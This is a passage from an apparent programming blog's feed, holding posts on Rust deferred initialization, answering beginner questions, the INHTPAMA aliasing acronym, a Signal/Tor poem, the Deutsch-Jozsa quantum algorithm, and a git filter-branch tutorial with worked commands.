<p>What&rsquo;s less well known is that Rust <em>can</em> do &ldquo;deferred&rdquo; initialization. Here, you declare a variable
and can initialize it later, but expressions involving the variable can only exist in branches
where the compiler knows it has been initialized.</p>

<p>This is the case here. We declared the <code>owned</code> variable beforehand. It now lives in the outer scope
and won&rsquo;t be destroyed until the end of the outer scope. However, the variable cannot be used directly
in an expression in the first branch, or after the <code>if</code>. Doing so will give a compile time error
saying <code>use of possibly uninitialized variable: `owned`</code>. We can only use it in the <code>else</code> branch
because the compiler can see that it is unconditionally initialized in that branch.</p>

<p>We can still read the value of <code>owned</code> indirectly through <code>maybe_foo</code> from outside the branch.
This is okay because the storage of <code>owned</code> is guaranteed to live as long as the outer scope,
and <code>maybe_foo</code> borrows from it. The only time <code>maybe_foo</code> is set to a value inside <code>owned</code> is when
<code>owned</code> has been initialized, so it is safe.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>In my experience <code>.as_ref()</code> is the solution to many, many borrow check issues newcomers come across, especially those involving <code>.map()</code><a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[You're Doing It Wrong]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/04/05/youre-doing-it-wrong/"/>
    <updated>2017-04-05T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/04/05/youre-doing-it-wrong</id>
    <content type="html"><![CDATA[<p>&ldquo;You&rsquo;re doing it wrong&rdquo;</p>

<p>A common refrain in issue trackers and discussion forums everywhere. In isolation,
it&rsquo;s a variant of RTFM &ndash; give a non-answer when someone wants help, and bounce them
back to a manual or docs which they probably have already read. Not very helpful,
and not useful to anyone. Of course, one can accompany it with a nice explanation
of how to do it right; &ldquo;You&rsquo;re doing it wrong&rdquo; isn&rsquo;t always a bad thing :)</p>

<p>Especially when it comes to programming languages, but in general in the context of any programming
tool or library, &ldquo;you&rsquo;re doing it wrong&rdquo; is almost always due to a &ldquo;bad&rdquo; mental model. The person, whilst
learning, has built a mental model of how the tool works, but this doesn&rsquo;t accurately reflect
reality. Other times, it does reflect reality, but it does not reflect the mental model of the
maintainers (there can be multiple valid ways of looking at something!),
which leads to an impedance mismatch when reading docs or error messages.</p>

<p>In other cases, &ldquo;doing it wrong&rdquo; is a <a href="https://meta.stackexchange.com/q/66377/178438">case of the XY problem</a>, where the user has problem X,
and think they can solve it with solution Y, and end up asking how they can achieve Y. This happens pretty
often &mdash; folks may be approaching your technology with prior experience with related things
that work differently, and may think the same idioms apply.</p>

<p>When I was at <a href="https://maintainerati.org/">WONTFIX</a>, someone who had done support work in the past mentioned that one
thing everyone learns in support is <strong>&ldquo;the user is always wrong &hellip;. and it&rsquo;s not their fault!&rdquo;</strong>.</p>

<p>This is a pretty good template for an attitude to approach &ldquo;doing it wrong&rdquo; questions about your
technology on online forums as well. And this doesn&rsquo;t just benefit the users who ask questions,
this attitude can benefit your technology!</p>

<p>Back when I used to be more active contributing to the Rust compiler, I also used to hang out in
<code>#rust</code> a lot, and often answer newbie questions (now <code>#rust-beginners</code> exists too, and I hang out
in both, but I don&rsquo;t really actively participate as much). One thing I learned to do was probe
deeper into why people hit that confusion in the first place. It&rsquo;s almost always a &ldquo;bad&rdquo; mental
model. Rust is rarely the first programming language folks learn, and people approach it with
preconceptions about how programming works. This isn&rsquo;t unique to Rust, this happens any time someone
learns a language with a different paradigm &mdash; learning C or C++ after doing a GCd language,
learning a functional language after an imperative one, statically typed after dynamic, or one of
the many other axes by which programming languages differ.</p>

<p>Other times, it&rsquo;s just assumptions they made when reading between the lines of whatever resource
they used to learn the language.</p>

<p>So, anyway, folks often have a &ldquo;bad&rdquo; mental model. If we are able to identify that model and correct
it, we have saved that person from potentially getting confused at every step in the future. Great!</p>

<p>With a <em>tiny</em> bit more effort, however, we can do one step better. Not for that person, but for
ourselves! We can probe a bit more and try to understand what caused them to obtain that mental
model. And fix the docs so that it never happens again! Of course, not everyone reads the docs, but
that&rsquo;s what diagnostics are for (in the case of errors). They&rsquo;re a tool to help us nudge the user
towards the right mental model, whilst helping them fix their immediate problem. Rust has for a long
time had pretty great diagnostics, with improvements happening all the time<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. I think this is at
least in part due to the attitude of the folks in <code>#rust</code>; always trying to figure out how to
preempt various confusions they see.</p>

<p>It&rsquo;s a good attitude to have. I hope more folks, both in and out of the Rust community, approach
&ldquo;You&rsquo;re doing it wrong&rdquo; cases like that.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Diagnostics issues are often the easiest way to contribute to the compiler itself, so if you want to contribute, I suggest starting there. Willing to mentor!<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[I Never Hear the Phrase 'INHTPAMA' Anymore]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/18/inhtpinhtpamaa/"/>
    <updated>2017-03-18T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/18/inhtpinhtpamaa</id>
    <content type="html"><![CDATA[<p>Imagine never hearing the phrase &lsquo;INHTPAMA&rsquo; again.</p>

<p>Oh, that&rsquo;s already the case? Bummer.</p>

<p>Often, when talking about Rust, folks refer to the core aliasing rule as &ldquo;that <code>&amp;mut</code> thing&rdquo;,
&ldquo;compile-time <code>RWLock</code>&rdquo; (or &ldquo;compile-time <code>RefCell</code>&rdquo;), or something similar. Basically, referring to
the fact that you can&rsquo;t mutate the data that is currently held via an <code>&amp;</code> reference, and that you
can&rsquo;t mutate or read the data currently held via an <code>&amp;mut</code> reference except through that reference
itself.</p>

<p>It&rsquo;s always bugged me that we really don&rsquo;t have a name for this thing. It&rsquo;s one of the core
bits of Rust, and crops up often in discussions.</p>

<p>But we did have a name for it! It was &ldquo;INHTPAMA&rdquo; (which was later butchered into &ldquo;INHTWAMA&rdquo;).</p>

<p>This is a reference to <a href="http://smallcultfollowing.com/babysteps/blog/2012/11/18/imagine-never-hearing-the-phrase-aliasable/">Niko&rsquo;s 2012 blog post</a>, titled
&ldquo;Imagine Never Hearing The Phrase &lsquo;aliasable, mutable&rsquo; again&rdquo;. It&rsquo;s where the aliasing
rules came from. Go read it, it&rsquo;s great. It talks about this weird language with at symbols
and purity, but I assure you, that language is Baby Rust. Or maybe Teenage Rust. The
<a href="https://www.ars.usda.gov/images/docs/9910_10104/Pg-lifecycle.jpg">lifecycle of rusts is complex and interesting</a> and I don&rsquo;t know how to categorize it.</p>

<p>The point of this post isn&rsquo;t really to encourage reviving the use of &ldquo;INHTWAMA&rdquo;; it&rsquo;s
a rather weird acronym that will probably confuse folks. I would like to have a better
way of refering to &ldquo;that <code>&amp;mut</code> thing&rdquo;, but I&rsquo;d prefer if it wasn&rsquo;t a confusing acronym
that carries no meaning of its own if you don&rsquo;t know the history of it. That&rsquo;s a recipe for
making new community members feel like outsiders.</p>

<p>But that post is amazing and I&rsquo;d hate to see it drop out of the collective
memory of the Rust community.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Use Signal. Use Tor.]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/12/use-signal-use-tor/"/>
    <updated>2017-03-12T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/12/use-signal-use-tor</id>
    <content type="html"><![CDATA[<p>I went to send a missive today<br>
As I have done so oft before<br>
But I forgot to employ that scrap of advice<br>
&ldquo;Use Signal. Use Tor.&rdquo;</p>

<p>Intercepted of course the missive was<br>
By a ferocious beast of lore<br>
Because I failed to use that bit of advice<br>
&ldquo;Use Signal. Use Tor.&rdquo;</p>

<p>The beast was strong; and formidable<br>
He hated the amendments four<br>
I should have remembered that piece of advice<br>
&ldquo;Use Signal. Use Tor.&rdquo;</p>

<p>I tried to reason with the beast<br>
but he only wanted war<br>
Do not neglect that important advice<br>
&ldquo;Use Signal. Use Tor.&rdquo;</p>

<p>Here I lie in the belly of the beast<br>
I shall discount this advice no more<br>
If I ever manage to leave this place<br>
I&rsquo;ll use Signal, and Tor.</p>

<p>Heed this advice, children.<br>
It&rsquo;s not something to ignore<br>
Always, always, always, always<br>
Use Signal. Use Tor.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why Quantum Computing Is Weird]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/11/why-quantum-computing-is-weird/"/>
    <updated>2017-03-11T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/11/why-quantum-computing-is-weird</id>
    <content type="html"><![CDATA[<p><em>I&rsquo;ve been meaning to write about physics for a while. When I started this blog the intention was to
write about a wide variety of interests, but I ended up focusing on programming, despite the fact
that I was doing more physics than programming for most of the lifetime of this blog. Time to change
that, and hopefully write about other non-programming topics too.</em></p>

<p>Quantum Computing. It&rsquo;s the new hip thing that&rsquo;s going to change the world<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Someday.</p>

<p>In it&rsquo;s essence, where classical computing deals with &ldquo;bits&rdquo;, which are on/off states, quantum
computing deals with &ldquo;qubits&rdquo;, which are probabalistic quantum states that are often a mixture of on
and off. These have interesting properties which make certain kinds of so-far-hard computation very
easy to perform.</p>

<p>The goal of this post is not to teach quantum computing, rather to garner interest. I come to praise
quantum computing, not bury it<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. As a result, this post doesn&rsquo;t require a background in physics.
Having worked with very simple logic circuits is probably enough, though you may not even need that.</p>

<p>I&rsquo;m basically going to sketch out an example of a very simple quantum algorithm. One that&rsquo;s very
logic-defying. It&rsquo;s even logic-defying for many who have studied quantum mechanics; it certainly
was for me. When I learned this first I could understand <em>why</em> it worked but there was a lot of
dissonance between that and my intuitive conviction that it was <em>wrong</em>.</p>

<h2>The algorithm</h2>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/deutsch/deutsch-jozsa.png" width="600"></p>

<p>This is a quantum circuit (specifically, the circuit for the <a href="https://en.wikipedia.org/wiki/Deutsch%E2%80%93Jozsa_algorithm">Deutsch-Jozsa algorithm</a>).
It&rsquo;s used to find out the nature of a black-box function <code>f(x)</code>, which takes in one qubit and outputs
another<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>. For now, you can try to interpret this circuit as if it were a regular logic circuit.
You&rsquo;ll soon see that this interpretation is wrong, but it&rsquo;s useful for the purposes of this explanation.</p>

<p>To run this algorithm, you first construct an &ldquo;oracle&rdquo; out of the black-box function. The oracle,
given inputs <code>x</code> and <code>y</code>, has outputs <code>x</code> and <code>y ⊕ f(x)</code> (where <code>⊕</code> is the symbol for XOR, the
&ldquo;exclusive OR&rdquo;).</p>

<p>As with logic circuits, data flow here goes from left to right. This circuit has two constant
inputs, a zero and a one. This is similar to how we might have constant &ldquo;true&rdquo; and &ldquo;false&rdquo; inputs
to logic circuits.</p>

<p>They are then passed through &ldquo;Hadamard gates&rdquo;. These are <em>like</em> NOT gates, in that applying them
twice is a no-op (they are their own inverse), but they&rsquo;re not actually NOT gates. I like to
describe them as &ldquo;sideways NOT gates&rdquo; since that description somewhat intuitively captures what&rsquo;s
going on with the qubits. What&rsquo;s important to note here is that they have one input and one
output, so they&rsquo;re unaffected by the goings-on in a different wire.</p>

<p>Once these inputs have been Hadamard&#8217;ed, they are fed to the oracle we constructed. The top input
goes on to become the top output. It&rsquo;s also passed through <code>f(x)</code> and XORd with the bottom input to make
the bottom output.</p>

<p>The top output is then Hadamard&#8217;ed again, and finally we observe its value.</p>

<p>Here&rsquo;s where the magic comes in. By observing the top output, <em>we will know the nature of <code>f(x)</code></em><sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>

<p>Wait, what? The top output doesn&rsquo;t appear to have any interaction with <code>f(x)</code> at all! How can that work?</p>

<p>In fact, we could try to rewrite this circuit such that the measured output definitely has no interaction with
<code>f(x)</code> whatever, assuming that the Hadamard gate isn&rsquo;t doing anything funky<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup> (it isn&rsquo;t):</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/deutsch/deutsch-jozsa-wrong.png" width="600"></p>

<p>How in the world does this work?</p>

<h2>Why it works</h2>

<p>Sadly, I can&rsquo;t give a satisfying explanation to <em>exactly</em> why this works. This requires some quantum mechanics
background<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup> to grasp.</p>

<p>However, I can give a hopefully-satisfying explanation as to why our regular intuition doesn&rsquo;t work here.</p>

<p>First and foremost: The rewritten circuit I showed above? It&rsquo;s wrong. If this was a logic circuit, we could always do that,
but in quantum computing, T-junctions like the following can&rsquo;t exist:</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/deutsch/deutsch-jozsa-tjunction.png" width="600"></p>

<p>This is due to the <a href="https://en.wikipedia.org/wiki/No-cloning_theorem">&ldquo;No Cloning theorem&rdquo;</a>. Unlike regular logic circuits, you can&rsquo;t
just &ldquo;duplicate&rdquo; a qubit. In some cases (like this one), you can try to create a similar qubit
via the same process (e.g. here we could take another 0 and pass it through a Hadamard gate), but
it&rsquo;s not the &ldquo;same&rdquo; qubit. Unlike bits, qubits have a stronger notion of unique identity.</p>

<p>And it&rsquo;s this sense of identity that fuels this algorithm (and most of quantum computing).</p>

<p>You see, while the top output of the oracle was <code>x</code>, it wasn&rsquo;t exactly the <em>same</em> <code>x</code>. This <code>x</code> had
been mixed with the lower output. This means that the upper and lower outputs are now <em>entangled</em>,
with their state depending on each other. In fact, it&rsquo;s really misleading to show the output as two
wires in the first place &ndash; it&rsquo;s really a single &ldquo;entangled&rdquo; state of two qubits that can&rsquo;t be
decomposed as a &ldquo;top half&rdquo; and a &ldquo;bottom half&rdquo;. Of course, this way of representing quantum circuits
is still used because it&rsquo;s a tidy way of visualizing these circuits, and physicists are aware of the
caveats involved.</p>

<p>So what happens is that when you observe the top output, you are really doing a partial observation
on the combined state of the two outputs, and this includes some information about <code>f(x)</code>, which
leaks out when you perform the observation.</p>

<p>These properties of qubits make quantum circuits work significantly differently from regular logic
ones. On one hand, this severely restricts what you can do with them, but at the same time, new
avenues of erstwhile-impossible operations open up. Most useful quantum algorithms (like Shor&rsquo;s
factorization algorithm) involve a mixture of a classical algorithm and a quantum circuit due to
this reason. It&rsquo;s pretty cool!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>What isn&rsquo;t?<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>The abstruseness of physics lives after it; the coolness is oft interred with its bones.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>This actually can be generalized to a function with n input and n output qubits, and the circuit stays mostly the same, except the top &ldquo;x&rdquo; line becomes n lines all initialized to 0 and passing through n parallel H gates.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Specifically, if the observation is 1, the function is a constant, whereas if the observation is 0, the function is &ldquo;balanced&rdquo; (gives a different output for inputs 1 and 0)<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>For Hadamard is an honorable gate. So are they all, all honorable gates.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>If you do have this background, it&rsquo;s relatively straightforward; the Wikipedia page has the equations for it.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Understanding Git Filter-branch and the Git Storage Model]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/05/understanding-git-filter-branch/"/>
    <updated>2017-03-05T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/05/understanding-git-filter-branch</id>
    <content type="html"><![CDATA[<p>The other day <a href="http://twitter.com/steveklabnik">Steve</a> wanted git alchemy done on the Rust repo.</p>

<p>Specifically, he wanted the reference and nomicon moved out into
their <a href="https://github.com/rust-lang-nursery/reference">own</a> <a href="https://github.com/rust-lang-nursery/nomicon">repositories</a>, preserving history. Both situations had some interesting
quirks, the reference has lived in <code>src/doc/reference/*</code> and <code>src/doc/reference.md</code>,
and the nomicon has lived in <code>src/doc/nomicon</code>, <code>src/doc/tarpl</code>, and at the top level
in a separate git root.</p>

<p>As you can guess from the title of this post, the correct tool for this job is <code>git filter-branch</code>.
<a href="https://twitter.com/indygreg">My colleague Greg</a> calls it &ldquo;the swiss-army knife of Git history rewriting&rdquo;.</p>

<p>I had some fun with filter-branch that day, thought I&rsquo;d finally write an accessible tutorial for it. A lot
of folks treat filter-branch like rebase, but it isn&rsquo;t, and this crucial difference can lead to many
false starts. It certainly did for me back when I first learned it.</p>

<p>This kind of ties into the common bit of pedantry about the nature of a commit I keep seeing pop up:</p>

<blockquote><p><a href="https://twitter.com/ManishEarth/status/837203953926352896">Git commits appear to be diffs, but they&rsquo;re actually file copies, but they&rsquo;re actually ACTUALLY diffs.</a></p></blockquote>

<h2>So what is a git commit?</h2>

<p>Generally we interact with git commits via <code>git show</code> or by looking at commits on
a git GUI / web UI. Here, we see diffs. It&rsquo;s natural to think of a commit as a diff,
it&rsquo;s the model that makes the most sense for the most common ways of interacting
with commits. It also makes some sense from an implementation point of view, diffs
seem like an efficient way of storing things.</p>

<p>It turns out that the &ldquo;real&rdquo; model is not this, it&rsquo;s actually that each commit
is a snapshot of the whole repo state at the time.</p>

<p>But actually, it isn&rsquo;t, the underlying implementation does make use of deltas
in packfiles and some other tricks like copy-on-write forking.</p>

<p>Ultimately, arguing about the &ldquo;real&rdquo; mental model is mostly pedantry. There are
multiple ways of looking at a commit. The documentation tends to implicitly think
of them as &ldquo;full copies of the entire file tree&rdquo;, which is where most
of the confusion about <code>filter-branch</code> comes from. But often it&rsquo;s important
to picture them as diffs, too.</p>

<p>Understanding the implementation can be helpful, especially when you break the
repository whilst doing crazy things (I do this often). I&rsquo;ve explained how it works
in a later section, it&rsquo;s not really a prerequisite for understanding filter-branch,
but it&rsquo;s interesting.</p>

<h2>How do I rewrite history with <code>git rebase</code>?</h2>

<p>This is where some of the confusion around <code>filter-branch</code> stems from. Folks have worked with
<code>rebase</code>, and they think <code>filter-branch</code> is a generalized version of this. They&rsquo;re actually quite
different.</p>

<p>For those of you who haven&rsquo;t worked with <code>git rebase</code>, it&rsquo;s a pretty useful way of rewriting
history, and is probably what you should use when you want to rewrite history, especially for
maintaining clean git history in an unmerged under-review branch.</p>

<p>Rebase does a whole bunch of things. Its core task is, given the current branch and a branch that
you want to &ldquo;rebase onto&rdquo;, it will take all commits unique to your branch, and apply them in order
to the new one. Here, &ldquo;apply&rdquo; means &ldquo;apply the diff of the commit, attempting to resolve any conflicts&rdquo;.
At times, it may ask you to manually resolve the conflicts, using the same tooling
you use for conflicts during <code>git merge</code>.</p>

<p>Rebase is much more powerful than that, though. <code>git rebase -i</code> will open up &ldquo;interactive rebase&rdquo;,
which will show you the commits that are going to be rebased. In this interface, you can reorder
commits, mark them for edits (wherein the rebase will stop at that commit and let you <code>git commit
--amend</code> changes into it), and even &ldquo;squash&rdquo; commits which lets you mark a commit to be absorbed
into the previous one. This is rather useful for when you&rsquo;re working on a feature and want to keep
your commits neat, but also want to make fixup patches to older commits. <a href="https://blog.filippo.io/git-fixup-amending-an-older-commit/">Filippo&rsquo;s <code>git fixup</code> alias</a>
packages this particular task into a single git command. Changing <code>EDITOR=true</code> into
<code>EDITOR=: GIT_SEQUENCE_EDITOR=:</code> will make it not even open the editor for confirmation
and try to do the whole thing automatically.</p>

<p><code>git rebase -x some_command</code> is also pretty neat, lets you run a shell command on each step during a rebase.</p>

<p>In this model, you are fundamentally thinking of commits as diffs. When you move around
commits in the interactive rebase editor, you&rsquo;re moving around diffs. When you mark things
for squashing, you&rsquo;re basically merging diffs. The whole process is about taking a set of
diffs and applying them to a different &ldquo;base commit&rdquo;.</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/memes/diffs-everywhere.jpg" width="400"></p>

<h2>How do I rewrite history with <code>git filter-branch</code>?</h2>

<p><code>filter-branch</code> does <em>not</em> work with diffs. You&rsquo;re working with the &ldquo;snapshot&rdquo; model
of commits here, where each commit is a snapshot of the tree, and rewriting these commits.</p>

<p>What <code>git filter-branch</code> will do is for each commit in the specified branch, apply filters to the
snapshot, and create a new commit. The new commit&rsquo;s parent will be the filtered version of the old
commit&rsquo;s parent. So it creates a parallel commit DAG.</p>

<p>Because the filters apply on the snapshots instead of the diffs, there&rsquo;s no chance for this to cause
conflicts like in git rebase. In git rebase, if I have one commit that makes changes to a file, and
I change the previous commit to just remove the area of the file that was changed, I&rsquo;d have a conflict
and git would ask me to figure out how the changes are supposed to be applied.</p>

<p>In git-filter-branch, if I do this, it will just power through. Unless you explicitly write
your filters to refer to previous commits, the new commit is created in isolation, so it doesn&rsquo;t
worry about changes to the previous commits. If you had indeed edited the previous commit,
the new commit will appear to undo those changes and apply its own on top of that.</p>

<p><code>filter-branch</code> is generally for operations you want to apply pervasively to a repository. If
you just want to tweak a few commits, it won&rsquo;t work, since future commits will appear to undo
your changes. <code>git rebase</code> is for when you want to tweak a few commits.</p>

<p>So, how do you use it?</p>

<p>The basic syntax is <code>git filter-branch &lt;filters&gt; branch_name</code>. You can use <code>HEAD</code> or <code>@</code>
to refer to the current branch instead of explicitly typing <code>branch_name</code>.</p>

<p>A very simple and useful filter is the subdirectory filter. It makes a given subdirectory
the repository root. You use it via <code>git filter-branch --subdirectory-filter name_of_subdir @</code>.
This is useful for extracting the history of a folder into its own repository.</p>

<p>Another useful filter is the tree filter, you can use it to do things like moving around, creating,
or removing files. For example, if you want to move <code>README.md</code> to <code>README</code> in the entire history,
you&rsquo;d do something like <code>git filter-branch --tree-filter 'mv README.md README' @</code> (you can also
achieve this much faster with some manual work and <code>rebase</code>). The tree filter will work by checking
out each commit (in a separate temporary folder), running your filter on the working directory,
adding any changes to the index (no need to <code>git add</code> yourself), and committing the new index.</p>

<p>The <code>--prune-empty</code> argument is useful here, as it removes commits which are now empty due to the
rewrite.</p>

<p>Because it is checking out each commit, this filter is quite slow. When I initially was trying to
do Steve&rsquo;s task on the rust repo, I wrote a long tree filter and it was taking forever.</p>

<p>The faster version is the index filter. However, this is a bit trickier to work with (which is why I
tend to use a tree filter if I can get away with it). What this does is operate on the index,
directly.</p>

<p>The &ldquo;index&rdquo; is basically where things go when you <code>git add</code> them. Running <code>git add</code> will create
temporary objects for the added file, and modify the WIP index (directory tree) to include a
reference to the new file or change an existing file reference to the new one. When you commit, this
index is packaged up into a commit and stored as an object. (More on how these objects work in a
later section)</p>

<p>Now, since this deals with files that are already stored as objects, git doesn&rsquo;t need to unwrap
these objects and create a working directory to operate on them. So, with <code>--index-filter</code>, you
can operate on these in a much faster way. However, since you don&rsquo;t have a working directory,
stuff like adding and moving files can be trickier. You often have to use <code>git update-index</code>
to make this work.</p>

<p>However, a useful index filter is one which just scrubs a file (or files) from history:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git filter-branch --index-filter <span class="s1">&#39;git rm --cached --ignore-unmatch filename&#39;</span> HEAD
</span></code></pre></td></tr></table></div></figure>


<p>The <code>--ignore-unmatch</code> makes the command still succeed if the file doesn&rsquo;t exist. <code>filter-branch</code>
will fail if one of the filters fails. In general I tend to write fallible filters like
<code>command1 1&gt;&amp;2 2&gt;/dev/null ; command2 1&gt;&amp;2 2&gt;/dev/null ; true</code>, which makes it always succeed
and also ignores any stdout/stderr output (which tends to make the progress screen fill up fast).</p>

<p>The <code>--cached</code> argument on <code>git rm</code> makes it operate only on the index, not the working directory.
This is great, because we don&rsquo;t <em>have</em> a working directory right now.</p>

<p>I rarely use <code>git update-index</code> so I&rsquo;m not really going to try and explain how it can be used here.
But if you need to do more complex operations in an index filter, that&rsquo;s the way to go.</p>

<p>There are many other filters, like <code>--commit-filter</code> (lets you discard a commit entirely),
<code>--msg-filter</code> (rewriting commit messages), and <code>--env-filter</code> (changing things like author metadata
or other env vars). You can see a complete list with examples <a href="https://git-scm.com/docs/git-filter-branch">in the docs</a></p>

<h2>How did I perform the rewrites on the reference and nomicon?</h2>

<p>For the Rust Reference, basically I had to extract the history of <code>src/doc/reference.md</code>,
AND <code>src/doc/reference/*</code> (<code>reference.md</code> was split up into <code>reference/*.md</code> recently) into
its own commit. This is an easy tree filter to write, but tree filters take forever.</p>

<p>Instead of trying my luck with an index filter, I decided to just make it so that the
tree filter would be faster. I first extracted <code>src/doc/</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git filter-branch -f --prune-empty --subdirectory-filter src/doc @
</span></code></pre></td></tr></table></div></figure>


<p>Now I had a branch that contained only the history of <code>src/doc</code>, with the root directory moved to
<code>doc</code>. This is a much smaller repo than the entirety of Rust.</p>

<p>Now, I moved <code>reference.md</code> into <code>reference/</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git filter-branch -f --prune-empty --tree-filter <span class="s1">&#39;mkdir -p reference; mv reference.md reference 1&gt;/dev/null 2&gt;/dev/null; true&#39;</span> @
</span></code></pre></td></tr></table></div></figure>


<p>As mentioned before, the <code>/dev/null</code> and <code>true</code> bits are because the mv command will fail in some cases
(when reference.md doesn&rsquo;t exist), and I want it to just continue without complaining when that happens.
I only care about moving instances of that file, if that file doesn&rsquo;t exist there it&rsquo;s still okay.</p>

<p>Now, everything I cared about was within <code>reference</code>. The next step was simple:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git filter-branch -f --prune-empty --subdirectory-filter reference @
</span></code></pre></td></tr></table></div></figure>


<p>The whole process took maybe 10 minutes to run, most of the time being spent by the second command.
The final result can be found <a href="https://github.com/rust-lang-nursery/reference">here</a>.</p>

<p>For the nomicon, the task was easier. In the case of the nomicon, it has always resided in
<code>src/doc/nomicon</code>, <code>src/doc/tarpl</code>, or at the root. This last bit is interesting, when
<a href="http://twitter.com/Gankro/">Alexis</a> was working on the nomicon, he started off by hacking on it in a separate repo, but
then within that repo moved it to <code>src/doc/tarpl</code>, and performed a merge commit with rustc. There&rsquo;s
no inherent restriction in Git that all merges must have a common ancestor, and you can do stuff
like this. I was <a href="https://twitter.com/ManishEarth/status/837441118753062912">quite surprised</a> when I saw this, since it&rsquo;s pretty uncommon in general,
but really, many projects of that size will have stuff like this. Servo and html5ever do too, and usually
it&rsquo;s when a large project is merged into it after being developed on the side.</p>

<p>This sounds complicated to work with, but it wasn&rsquo;t that hard. I took the same subdirectory-filtere&rsquo;d
doc directory branch used for the reference. Then, I renamed <code>tarpl/</code> to <code>nomicon/</code> via a tree filter,
and ran another subdirectory filter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git filter-branch -f --prune-empty --tree-filter <span class="s1">&#39;mv tarpl nomicon 1&gt;/dev/null 2&gt;/dev/null; true&#39;</span> @
</span><span class='line'><span class="nv">$ </span>git filter-branch -f --prune-empty --subdirectory-filter nomicon @
</span></code></pre></td></tr></table></div></figure>


<p>Now, I had the whole history of the nomicon in the root dir. Except for the commits made by Alexis
before his frankenmerge, because these got removed in the first subdirectory filter (the commits
were operating outside of <code>src/doc</code>, even though their contents eventually got moved there).</p>

<p>But, at this stage, I already had a branch with the nomicon at the root. Alexis&#8217; original commits
were also operating on the root directory. I can just rebase here, and the diffs of my commits will
cleanly apply!</p>

<p>I found the commit (<a href="https://github.com/rust-lang/rust/commit/a54e64b3c41103c4f6ab840d8ddd3a56ec6b5da8"><code>a54e64</code></a>) where everything was moved to <code>tarpl/</code>, and took its parent
(<a href="https://github.com/rust-lang/rust/commit/c7919f2d9835578321bf7556ad1a01fa42e8a7e8"><code>c7919f</code></a>). Then, I just ran <code>git rebase --root c7919f</code>, and everything cleanly rebased.
As expected, because I had a history going back to the first child of <a href="https://github.com/rust-lang/rust/commit/a54e64b3c41103c4f6ab840d8ddd3a56ec6b5da8"><code>a54e64</code></a> with files
moved, and <a href="https://github.com/rust-lang/rust/commit/a54e64b3c41103c4f6ab840d8ddd3a56ec6b5da8"><code>a54e64</code></a> itself only moved files, so the diffs should cleanly apply.</p>

<p>The final result can be found <a href="https://github.com/rust-lang-nursery/nomicon">here</a>.</p>

<h2>Appendix: How are commits actually stored?</h2>

<p>The way the actual implementation of a commit works is that each file being stored is hashed and
stored in a compressed format, indexed by the hash. A directory (&ldquo;tree&rdquo;) will be a list of hashes, one for
each file/directory inside it, alongside the filenames and other metadata. This list will be hashed
and used everywhere else to refer to the directory.</p>

<p>A commit will reference the &ldquo;tree&rdquo; object for the root directory via its hash.</p>

<p>Now, if you make a commit changing some files, most of the files will be unchanged. So will most of
the directories. So the commits can share the objects for the unchanged files/directories, reducing
their size. This is basically a copy-on-write model. Furthermore, there&rsquo;s a second optimization
called a &ldquo;packfile&rdquo;, wherein instead of storing a file git will store a delta (a diff) and a
